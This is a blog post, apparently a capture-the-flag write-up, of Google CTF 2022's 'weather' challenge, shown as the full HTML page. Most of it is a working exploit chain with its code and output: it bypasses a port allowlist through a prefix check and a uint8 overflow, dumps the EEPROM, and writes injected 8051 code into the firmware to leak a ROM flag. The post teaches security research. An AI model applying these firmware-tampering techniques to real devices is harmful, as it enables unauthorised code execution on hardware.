@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Google Capture The Flag 2022 - weather | kileak</title>
+
+
+
+
+
+<meta name="description" content="Google Capture The Flag 2022 - weather">
+
+
+<meta name="keywords" content="google, weather">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2022/googlectf22-weather/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Google Capture The Flag 2022 - weather</h1>
+      <p class="post-meta">Jul 3, 2022</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Google Capture The Flag 2022 - weather
+<!--break--></p>
+
+  <p>Our DYI Weather Station is fully secure! No, really! Why are you laughing?! OK, to prove it we’re going to put a flag in the internal ROM, give you the 
+source code, datasheet, and network access to the interface.</p>
+
+  <p>weather.2022.ctfcompetition.com 1337</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/google2022/weather/weather.zip">weather.zip</a> <a href="https://kileak.github.io/assets/google2022/weather/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Weather Station
+? $  </code></pre></figure>
+
+<p>For this challenge, we were provided with the firmware sourcecode and a datasheet. Having not worked on hardware challenges by now, this was kinda new to me, but turned out to be quite some fun :)</p>
+
+<p>Going through the source code reveals that commands have to be sent in the format:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">r &lt;port&gt; &lt;req_len&gt;
+w &lt;port&gt; &lt;req_len&gt; &lt;value 1&gt; &lt;vlaue 2&gt; &lt;...&gt;</code></pre></figure>
+
+<p>for reading and writing to/from a port.</p>
+
+<p>The network interface provided access to some ports of the “weather station”, by which data can be read and write (though writing to the existing sensors won’t do much).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ALLOWED_I2C</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s">"101"</span><span class="p">,</span>  <span class="c1">// Thermometers (4x).</span>
+  <span class="s">"108"</span><span class="p">,</span>  <span class="c1">// Atmospheric pressure sensor.</span>
+  <span class="s">"110"</span><span class="p">,</span>  <span class="c1">// Light sensor A.</span>
+  <span class="s">"111"</span><span class="p">,</span>  <span class="c1">// Light sensor B.</span>
+  <span class="s">"119"</span><span class="p">,</span>  <span class="c1">// Humidity sensor.</span>
+  <span class="nb">NULL</span>
+<span class="p">};</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Weather Station
+? $ r 101 10
+i2c status: transaction completed / ready
+22 22 21 35 0 0 0 0 0 0 
+-end
+? $ r 108 10
+i2c status: transaction completed / ready
+3 249 0 0 0 0 0 0 0 0 
+-end
+? $ r 110 10
+i2c status: transaction completed / ready
+78 0 0 0 0 0 0 0 0 0 
+-end
+? $ r 111 10
+i2c status: transaction completed / ready
+81 0 0 0 0 0 0 0 0 0 
+-end
+? $ r 119 10
+i2c status: transaction completed / ready
+37 0 0 0 0 0 0 0 0 0 
+-end
+? $  </code></pre></figure>
+
+<p>The available sensors seemed to be a dead end, so we need to find a way to access “something else”.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">bool</span> <span class="nf">is_port_allowed</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">port</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">for</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">allowed</span> <span class="o">=</span> <span class="n">ALLOWED_I2C</span><span class="p">;</span> <span class="o">*</span><span class="n">allowed</span><span class="p">;</span> <span class="n">allowed</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pa</span> <span class="o">=</span> <span class="o">*</span><span class="n">allowed</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pb</span> <span class="o">=</span> <span class="n">port</span><span class="p">;</span>
+    <span class="n">bool</span> <span class="n">allowed</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">pa</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">pb</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">pa</span><span class="o">++</span> <span class="o">!=</span> <span class="o">*</span><span class="n">pb</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">allowed</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">allowed</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">pa</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Before passing our input data to the specified i2c port, the firmware will check, if we specified a valid port. At first glance, it seems that <code class="language-plaintext highlighter-rouge">is_port_allowed</code> compares the specified port and the allowed ports char by char and also checks that both end with a null byte.</p>
+
+<p>But <code class="language-plaintext highlighter-rouge">pb</code> (our input) is not checked for a null-byte, which enables us to specify a port string that “starts” with a valid port (like “101”). <code class="language-plaintext highlighter-rouge">"1010"</code>, <code class="language-plaintext highlighter-rouge">"1011"</code> and so on would also be valid.</p>
+
+<p>The datasheet states though, that the port in <code class="language-plaintext highlighter-rouge">I2C_ADDRESS</code> needs to be set as a 7-bit address, so only ports <code class="language-plaintext highlighter-rouge">0-127</code> would be valid. 
+Specifying a port <code class="language-plaintext highlighter-rouge">&gt;1010</code> thus wouldn’t be much of a help, but the way, the firmware converts our input string to a port can help with that :)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int8_t</span> <span class="nf">port_to_int8</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">port</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_port_allowed</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="p">(</span><span class="kt">int8_t</span><span class="p">)</span><span class="n">str_to_uint8</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">uint8_t</span> <span class="nf">str_to_uint8</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">uint8_t</span> <span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">digit</span> <span class="o">=</span> <span class="o">*</span><span class="n">s</span><span class="o">++</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">digit</span> <span class="o">&gt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">v</span> <span class="o">=</span> <span class="n">v</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">digit</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>It first checks, if the port is valid (which we can now fulfill by prepending a valid port), and then converts our input number to an <code class="language-plaintext highlighter-rouge">uint8_t</code>, which will just overflow when passing it bigger numbers.</p>
+
+<p>Abusing this, we can specify any port we need.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">send_read</span><span class="p">(</span><span class="n">dest_port</span><span class="p">,</span> <span class="n">req_len</span><span class="p">):</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"Read from: %d"</span> <span class="o">%</span> <span class="n">dest_port</span><span class="p">)</span>
+
+  <span class="c1"># forge port number to overflow into requested port number
+</span>  <span class="n">cmd</span> <span class="o">=</span> <span class="s">"r 1010000{} {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">dest_port</span><span class="o">+</span><span class="mi">128</span><span class="p">,</span> <span class="n">req_len</span><span class="p">)</span>
+	
+  <span class="c1"># send i2c command
+</span>  <span class="k">print</span><span class="p">(</span><span class="s">"CMD: %s"</span> <span class="o">%</span> <span class="n">cmd</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+  <span class="c1"># show i2c response
+</span>  <span class="k">print</span><span class="p">(</span><span class="s">"RESP: %s"</span> <span class="o">%</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+
+  <span class="c1"># read and parse response
+</span>  <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" </span><span class="se">\n</span><span class="s">-end"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">" "</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>	
+  <span class="n">res</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)),</span> <span class="n">data</span><span class="p">))</span>
+
+  <span class="k">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"? "</span><span class="p">)</span>
+
+  <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">send_write</span><span class="p">(</span><span class="n">dest_port</span><span class="p">,</span> <span class="n">req_len</span><span class="p">,</span> <span class="n">values</span><span class="p">):</span>
+  <span class="c1"># forge port number to overflow into requestes port number
+</span>  <span class="n">cmd</span> <span class="o">=</span> <span class="s">"w 1010000{} {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">dest_port</span><span class="o">+</span><span class="mi">128</span><span class="p">,</span> <span class="n">req_len</span><span class="p">)</span>
+
+  <span class="c1"># append values
+</span>  <span class="k">for</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>		
+    <span class="n">cmd</span> <span class="o">+=</span> <span class="s">" "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+
+  <span class="c1"># send i2c command
+</span>  <span class="k">print</span><span class="p">(</span><span class="s">"CMD: %s"</span> <span class="o">%</span> <span class="n">cmd</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+  <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"? "</span><span class="p">))</span></code></pre></figure>
+
+<p>Since we’re now able to read and write from any port, I did exactly that and tried to read from every port from <code class="language-plaintext highlighter-rouge">0-127</code> to see, if we get any valid response.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Opening connection to weather.2022.ctfcompetition.com on port 1337: Done
+...
+
+Read from: 33
+CMD: r 1010000161 10
+RESP: i2c status: transaction completed / ready
+
+00000000  02 00 06 02  04 e4 75 81  30 12                     │····│··u·│0·│
+0000000a
+
+...</code></pre></figure>
+
+<p>Apart from the existing weather sensors, only port <code class="language-plaintext highlighter-rouge">33</code> answered with a successful response.</p>
+
+<p>This would probably be the <code class="language-plaintext highlighter-rouge">CTF-55930 EPROM</code> interface mentioned in the data sheet, which allows us to access the eprom data and reprogram it.</p>
+
+<p>Let’s validate that by dumping the firmware itself</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">I2C interface
+
+Reading data from a 64-byte page is done in two steps:
+1. Select the page by writing the page index to EEPROM's I2C address.
+2. Receive up to 64 bytes by reading from the EEPROM's I2C address.</code></pre></figure>
+
+<p>So we have to first send the page index to the port and after that we can read the page data from it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># dump eprom
+</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"eprom.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+    <span class="n">send_write</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">[</span><span class="n">i</span><span class="p">])</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">send_read</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+
+    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+    <span class="n">f</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span></code></pre></figure>
+
+<p>Opening the received file with <code class="language-plaintext highlighter-rouge">ghidra</code> (use ‘8051 Microcontroller Family’ for Language/processor) shows that we have indeed fetched the complete firmware.</p>
+
+<p>One step further, but how can we now read the flag? Obviously, it’s not part of the firmware itself, but resides in the <code class="language-plaintext highlighter-rouge">FlagROM</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">FlagROM module
+
+The CTF-8051 microcontroller features an SFR-accessible ROM containing the flag. It's a very simple factory-programmed
+ROM device with an SFR-mapped interface.
+
+The ROM has capacity to store up to 2048 bits (256x8).
+
+To read the data from the ROM simply set the FLAGROM_ADDR register to the byte index and read the byte value from the
+FLAGROM_DATA register.
+
+■ Reading from the FLAGROM_ADDR register returns the currently set address.
+■ Writing to FLAGROM_DATA register is a no-op.
+
+Special Function Register declarations for SDK compiler:
+__sfr __at(0xee) FLAGROM_ADDR;
+__sfr __at(0xef) FLAGROM_DATA;</code></pre></figure>
+
+<p>Sounds easy enough: write the index of a flag char to <code class="language-plaintext highlighter-rouge">0xee</code> and then read the character from <code class="language-plaintext highlighter-rouge">0xef</code>.</p>
+
+<p>Those <code class="language-plaintext highlighter-rouge">sfr</code> registers are never accessed anywhere in the firmware, though.</p>
+
+<p>But since we have access to the EPROM interface, we now also have the ability to reprogram it and write our own code into it.</p>
+
+<p>First thought: let’s just overwrite an existing function in the firmware to dump the flag for us.</p>
+
+<p>Checking the datasheet how reprogramming is done:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Programming the EEPROM is done by writing the following packet to the EEPROM's I2C address:
+  &lt;PageIndex&gt; &lt;4ByteWriteKey&gt; &lt;ClearMask&gt; ... &lt;ClearMask&gt;
+
+The PageIndex selects a 64-byte page to operate on. The WriteKey is a 4 byte unlock key meant to prevent accidental
+overwrites. Its value is constant: A5 5A A5 5A. Each ClearMask byte is applied to the consecutive bytes of the page,
+starting from byte at index 0. All bits set to 1 in the ClearMask are cleared (set to 0) for the given byte in the
+given page on the EEPROM:
+
+byte[i] ← byte[i] AND (NOT clear_mask_byte)
+
+Note: The only way to bring a bit back to 1 is to follow the 12V full memory reset described in the "Programming the
+CTF-55930" section.</code></pre></figure>
+
+<p>Uhm, ok, we can only “clear” bits, but won’t be able to set any <code class="language-plaintext highlighter-rouge">0</code> bit to <code class="language-plaintext highlighter-rouge">1</code> again, except by doing a full reset (which obviously is not possible through the network access). So overwriting existing code might be a bit too difficult.</p>
+
+<p>But we have a lot of memory at the end of the firmware, which is completely filled with <code class="language-plaintext highlighter-rouge">1</code> bits, so we can start by putting our “flag dumping” code there.</p>
+
+<p>Let’s start with writing data to uninitialized pages</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">write_eprom</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+  <span class="c1"># start package with page index and 4ByteWriteKey
+</span>  <span class="n">write_arr</span> <span class="o">=</span> <span class="p">[</span><span class="n">page</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">]</span>
+
+  <span class="c1"># add inverted byte as clear mask
+</span>  <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+    <span class="n">write_arr</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xff</span><span class="p">)</span>
+
+  <span class="c1"># send package
+</span>  <span class="n">send_write</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">write_arr</span><span class="p">),</span> <span class="n">write_arr</span><span class="p">)</span></code></pre></figure>
+
+<p>Since we can only clear bits, we just invert the byte we want to write, resulting in a clear mask, that zeroes all bits, which are not set in our write data. As long as the destination page is filled with <code class="language-plaintext highlighter-rouge">0xff</code> bytes, we can now write arbitrary code there.</p>
+
+<p>Having never worked with <code class="language-plaintext highlighter-rouge">8051</code> before, it was time now to learn some basics on 8051 asm (<a href="https://www.keil.com/support/man/docs/is51/is51_opcodes.htm" target="_blank">8051 opcodes</a>).</p>
+
+<p>So, first we need to initialize an index counter and write it to <code class="language-plaintext highlighter-rouge">FLAGROM_ADDR</code> (<code class="language-plaintext highlighter-rouge">0xee</code>)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">; set idx to 0 (r1)
+mov R1, 0         79 00
+
+; set FLAGROM_ADDR to idx
+mov A, R1         E9
+mov 0xEE, A       F5 EE</code></pre></figure>
+
+<p>Now we should be able to read the first character of the flag from <code class="language-plaintext highlighter-rouge">FLAGROM_DATA</code> (<code class="language-plaintext highlighter-rouge">0xef</code>)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">; read char from FLAGROM_DATA 
+mov A, 0xEF       E5 EF
+mov R0, A         F8</code></pre></figure>
+
+<p>Having the character in a register, we now want to print it back via the serial controller.</p>
+
+<p>For this, we’ll first have to wait for <code class="language-plaintext highlighter-rouge">SERIAL_OUT_READY</code> (<code class="language-plaintext highlighter-rouge">0xf3</code>)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">; wait for SERIAL_OUT_READY
+mov A, 0xF3       E5 F3
+jz 0xFC           60 FC</code></pre></figure>
+
+<p>After that, we can write the current flag character to <code class="language-plaintext highlighter-rouge">SERIAL_OUT_DATA</code> (<code class="language-plaintext highlighter-rouge">0xf2</code>)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">; write flag char to SERIAL_OUT_DATA
+mov A, R0         E8
+mov 0xF2, A       F5 F2</code></pre></figure>
+
+<p>This should print the first character to the network interface. All that’s left now, is to increase the index and jump back to our loop (which should end up in infinitely printing out the content of <code class="language-plaintext highlighter-rouge">FLAGROM</code>).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">; increase idx (r1)
+inc R1            09
+
+; jump back
+sjmp 0xF0         80 F0</code></pre></figure>
+
+<p>To see, if I got it right, I patched it into the dumped eprom and checked the decompilation in ghidra.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">UndefinedFunction_0a04</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">undefined</span> <span class="n">flag_char</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">res</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">idx</span><span class="p">;</span>
+  
+  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="c1">// write flag char index</span>
+    <span class="n">write_volatile_1</span><span class="p">(</span><span class="n">FLAGROM_ADDR</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+    <span class="n">flag_char</span> <span class="o">=</span> <span class="n">read_volatile_1</span><span class="p">(</span><span class="n">FLAGROM_DATA</span><span class="p">);</span>
+
+    <span class="c1">// wait for serial</span>
+    <span class="k">do</span> <span class="p">{</span>
+      <span class="n">res</span> <span class="o">=</span> <span class="n">read_volatile_1</span><span class="p">(</span><span class="n">SERIAL_OUT_READY</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">);</span>
+
+    <span class="c1">// write flag char to serial</span>
+    <span class="n">write_volatile_1</span><span class="p">(</span><span class="n">SERIAL_OUT_DATA</span><span class="p">,</span><span class="n">flag_char</span><span class="p">);</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Doesn’t look too bad :)</p>
+
+<p>Now, we’re just left with having our code being called from the firmware.</p>
+
+<p>Overwriting the existing firmware with our complete flag dumper code might have been a quite hard (to impossible) task, but now we just need to write a single <code class="language-plaintext highlighter-rouge">ljmp</code> instruction somewhere.</p>
+
+<p>With <code class="language-plaintext highlighter-rouge">eprom_write</code> I wrote the flag dumper to address <code class="language-plaintext highlighter-rouge">0xa04</code> in the firmware, so we just need to put a <code class="language-plaintext highlighter-rouge">LJMP 0xa04</code> somewhere.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">JMP 0xA4      02 0A 04</code></pre></figure>
+
+<p>For this, I wrote some quick&amp;dirty code to scan the firmware for 3 consecutive bytes, in which all bits were set, so that we could transform them into <code class="language-plaintext highlighter-rouge">02 0A 04</code> by just clearing the superfluous bits.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"eprom.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+		
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
+    <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0x2</span> <span class="o">==</span> <span class="mh">0x2</span><span class="p">:</span>
+      <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xa</span> <span class="o">==</span> <span class="mh">0xa</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0x4</span> <span class="o">==</span> <span class="mh">0x4</span><span class="p">:</span>
+          <span class="k">print</span> <span class="s">"Found possible offset: %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span></code></pre></figure>
+
+<p>This gave some possible addresses (though not all of them were located at the start of a valid opcode).</p>
+
+<p>But from those, <code class="language-plaintext highlighter-rouge">0x341</code> looked the most promising, which was located in the <code class="language-plaintext highlighter-rouge">str_to_uint8</code> function. Overwriting it and then trigger a conversion to <code class="language-plaintext highlighter-rouge">uint8</code> in the firmware should effectively jump into our code.</p>
+
+<p>Let’s combine this and write the flag dumper code into the eprom, overwrite the code in <code class="language-plaintext highlighter-rouge">str_to_uint8</code> to jump there and then trigger it by reading from any port (which will try to convert the input string into a port number).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"? "</span><span class="p">)</span>
+
+  <span class="c1"># write flag dumper code to end of firmware
+</span>  <span class="n">write_eprom</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="s">"</span><span class="se">\x39\x00\xff\xff\x79\x00\xe9\xf5\xee\xe5\xef\xf8\xe5\xf3\x60\xfc\xe8\xf5\xf2\x09\x80\xf0</span><span class="s">"</span><span class="p">)</span>
+
+  <span class="c1"># write LJMP 0xa04 into str_to_uint8	
+</span>  <span class="n">address</span> <span class="o">=</span> <span class="mh">0x341</span>
+	
+  <span class="n">page</span> <span class="o">=</span> <span class="n">address</span> <span class="o">/</span> <span class="mi">64</span>
+  <span class="n">off</span> <span class="o">=</span> <span class="n">address</span> <span class="o">%</span> <span class="mi">64</span>
+
+  <span class="n">code</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="n">off</span>
+  <span class="n">code</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x02\x0a\x04</span><span class="s">"</span>
+
+  <span class="n">write_eprom</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+
+  <span class="c1"># trigger str_to_uint8
+</span>  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"r 119"</span><span class="p">)</span>
+
+  <span class="c1"># print output (filter null bytes)
+</span>  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">ch</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">ch</span> <span class="o">!=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">:</span>
+      <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+
+	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Opening connection to weather.2022.ctfcompetition.com on port 1337: Done
+CMD: w 1010000161 27 40 165 90 165 90 198 255 0 0 134 255 22 10 17 26 16 7 26 12 159 3 23 10 13 246 127 15
+i2c status: transaction completed / ready
+? 
+CMD: w 1010000161 9 13 165 90 165 90 255 253 245 251
+i2c status: transaction completed / ready
+? 
+CTF{DoesAnyoneEvenReadFlagsAnymore?}
+CTF{DoesAnyoneEvenReadFlagsAnymore?}
